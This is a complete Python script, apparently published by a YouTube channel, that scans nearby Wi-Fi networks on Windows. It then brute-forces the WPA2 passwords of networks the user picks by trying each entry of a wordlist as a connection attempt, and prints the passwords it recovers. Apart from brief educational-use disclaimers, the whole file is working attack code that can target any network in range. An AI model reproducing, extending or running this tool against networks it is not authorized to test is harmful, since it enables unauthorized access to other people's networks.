#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ElecnoTech Wi-Fi Tool v6.1
--------------------------
Scan nearby Wi-Fi networks and test passwords from a wordlist
against a selected target (educational / security-awareness use).

IMPORTANT: Use this tool ONLY on networks you own or have
explicit written permission to test. Unauthorized access to
networks is illegal in most countries.

YouTube : https://www.youtube.com/@ElecnoTech
GitHub  : https://github.com/ElecnoTech
"""

import argparse
import os
import platform
import sys
import time

# ---------- Windows check (pywifi only works on Windows) ----------
if platform.system() != "Windows":
    print("[-] This tool uses pywifi and only works on Windows (run the .exe or py wifi.py).")
    sys.exit(1)

from colorama import Fore, Style, init
from pywifi import PyWiFi, const, Profile
from tqdm import tqdm

# Plain-text output (no ANSI codes) so the .exe works on every console
init(autoreset=True, strip=True)

RED, BLUE, CYAN, GREEN, YELLOW = Fore.RED, Fore.BLUE, Fore.CYAN, Fore.GREEN, Fore.YELLOW
RESET, BOLD = Fore.RESET, Style.BRIGHT

BRAND = "Created by ElecnoTech | YouTube: @ElecnoTech"

try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()
    if not ifaces:
        raise Exception("No Wi-Fi interface found on this system.")
    iface = ifaces[0]
except Exception as e:
    print(RED + f"[-] Error initializing Wi-Fi adapter: {e}")
    sys.exit(1)


def list_available_networks():
    """Scan and list nearby networks with signal + BSSID."""
    print(YELLOW + "Scanning for available networks...\n")
    iface.scan()
    time.sleep(3.5)
    results = iface.scan_results()

    print(BLUE + BOLD + "Available Networks:")
    networks = []
    for idx, net in enumerate(results, start=1):
        ssid = net.ssid or "<Hidden>"
        quality = max(0, min(100, (net.signal + 100) * 2))  # rough dBm -> %
        networks.append((idx, ssid, net.signal, net.bssid))
        print(f"{idx:>2} - {GREEN}{ssid}{RESET}  |  Signal: {CYAN}{net.signal} dBm (~{quality}%){RESET}  |  BSSID: {YELLOW}{net.bssid}")

    if not networks:
        print(RED + "[-] No networks found. Try again.")
        sys.exit(1)

    print("\n")
    return networks


def connect_to_wifi(ssid, password):
    """Try one password against the target. True = connected."""
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(0.5)

    if iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
        return True
    return False


def crack_password(ssid, wordlist_path):
    """Test every password from the wordlist against the target SSID."""
    if not os.path.exists(wordlist_path):
        print(RED + f"[-] Wordlist file not found: {wordlist_path}")
        sys.exit(1)

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(CYAN + f"[~] Loaded {len(passwords)} passwords from wordlist.")
    print(CYAN + f"[~] Target: {ssid}\n")

    for password in tqdm(passwords, desc=f"Testing {ssid}", unit="pass", leave=False):
        if connect_to_wifi(ssid, password):
            print(GREEN + BOLD + "\n[*] SUCCESS!")
            print(GREEN + f"[+] Password for {ssid}: {BOLD}{password}{RESET}")
            print(GREEN + BRAND)
            return password

    print(RED + f"[-] No valid password found for {ssid}.")
    return None


def multi_crack(targets, wordlist_path):
    found = {}
    for ssid in targets:
        print(BLUE + f"\n[~] Starting on SSID: {ssid}")
        pw = crack_password(ssid, wordlist_path)
        if pw:
            found[ssid] = pw

    if found:
        print(GREEN + BOLD + "\n===== SUMMARY =====")
        for s, p in found.items():
            print(GREEN + f"  {s}  ->  {p}")
        print(GREEN + BRAND)


def display_info():
    print(GREEN + BRAND)
    print(BLUE + f"[+] System: {platform.system()} {platform.machine()}")
    print(YELLOW + "[!] Educational use only - only test networks you own!\n")
    time.sleep(1.5)


def menu():
    parser = argparse.ArgumentParser(description="ElecnoTech Wi-Fi Tool (educational)")
    parser.add_argument("-w", "--wordlist", metavar="", type=str, help="Path to password wordlist")
    parser.add_argument("-v", "--version", action="store_true", help="Show version")
    args = parser.parse_args()

    if args.version:
        print(GREEN + "ElecnoTech Wi-Fi Tool v6.1")
        sys.exit(0)

    display_info()
    networks = list_available_networks()

    print(CYAN + "Enter the numbers of the networks you want to test, separated by commas (e.g. 1,3,5):")
    raw = input(CYAN + "Selected targets: ")
    targets = []
    for part in raw.split(","):
        try:
            idx = int(part.strip())
            ssid = next((n[1] for n in networks if n[0] == idx), None)
            if ssid:
                targets.append(ssid)
        except ValueError:
            continue

    if not targets:
        print(RED + "[-] No valid targets selected.")
        sys.exit(1)

    wordlist = args.wordlist or input(CYAN + "Enter path to password wordlist: ")
    multi_crack(targets, wordlist)


if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(RED + "\n[!] Exiting... (Interrupted by user)")
